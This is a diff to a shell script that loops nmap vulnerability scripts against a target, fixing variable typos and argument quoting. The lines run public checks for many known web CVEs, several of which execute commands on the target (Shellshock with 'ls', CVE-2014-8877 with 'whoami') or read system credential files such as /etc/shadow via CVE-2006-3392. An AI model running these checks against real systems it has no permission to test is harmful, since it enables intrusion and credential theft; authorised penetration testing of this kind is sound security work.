@@ -72,16 +72,15 @@ do
 	nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls $target
 	nmap -sV --script http-vuln-cve2006-3392 $target
  	nmap -p80 --script http-vuln-cve2006-3392 --script-args http-vuln-cve2006-3392.file=/etc/shadow $target
-	nmap --script=http-vuln-cve2009-3960 --script-args http-http-vuln-cve2009-3960.root="/root/" $target
-	nmap --script=http-vuln-cve2010-0738 --script-args 'http-vuln-cve2010-0738.paths={/path1/,/path2/}' $target
+	nmap --script=http-vuln-cve2009-3960 --script-args http-http-vuln-cve2009-3960.root=/root/ $target
+	nmap --script=http-vuln-cve2010-0738 --script-args http-vuln-cve2010-0738.paths=/jmx-console/ $target
 	nmap --script http-vuln-cve2010-2861 $target
 	nmap --script http-vuln-cve2011-3192.nse -pT:80,443 $target
-	nmap --script http-vuln-cve2011-3368 $targets
+	nmap --script http-vuln-cve2011-3368 $target
 	nmap -sV --script http-vuln-cve2012-1823 $target
 	nmap -p80 --script http-vuln-cve2012-1823 --script-args http-vuln-cve2012-1823.uri=/test.php $target
 	nmap -sV --script http-vuln-cve2013-0156 $target
 	nmap -sV --script http-vuln-cve2013-0156 --script-args uri="/test/" $target
-	nmap -p80 --script http-vuln-cve2013-6786 $target
 	nmap -sV http-vuln-cve2013-6786 $target
 	nmap -sV --script http-vuln-cve2013-7091 $target
 	nmap -p80 --script http-vuln-cve2013-7091 --script-args http-vuln-cve2013-7091=/ZimBra $target
@@ -93,7 +92,7 @@ do
 	nmap --script http-vuln-cve2014-3704 --script-args http-vuln-cve2014-3704.uri="/drupal",http-vuln-cve2014-3704.cleanup=false $target
 	nmap --script http-vuln-cve2014-8877 --script-args http-vuln-cve2014-8877.cmd="whoami",http-vuln-cve2014-8877.uri="/wordpress" $target
 	nmap --script http-vuln-cve2014-8877 $target
-	nmap --script=http-vuln-cve2015-1427 --script-args command= 'ls' $targets
+	nmap --script=http-vuln-cve2015-1427 --script-args command='ls' $target
 	nmap -sV --script vuln $target
 	nmap -p80 --script http-vuln-cve2015-1635.nse $target
 	nmap -sV --script http-vuln-cve2015-1635 --script-args uri='/anotheruri/' $target
